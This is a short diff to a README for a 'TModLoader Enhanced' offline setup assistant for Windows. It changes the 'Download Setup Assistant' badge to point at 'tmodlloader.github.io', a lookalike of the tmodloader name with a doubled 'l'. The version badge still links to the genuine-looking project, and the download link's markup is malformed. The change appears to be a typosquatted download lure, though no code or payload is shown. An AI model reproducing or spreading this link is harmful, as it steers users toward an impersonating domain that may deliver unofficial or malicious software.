@@ -1,6 +1,6 @@
 # TModLoader Enhanced — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://tmodlloader.github.io/.github/)](#)
 [![Version](https://img.shields.io/badge/Version-0.11.8.4-green)](https://github.com/tmodloader/tmodloader)
 [![Platform](https://img.shields.io/badge/Platform-Windows-blue)](#)
 [![License](https://img.shields.io/badge/License-Terraria-yellow)](#)
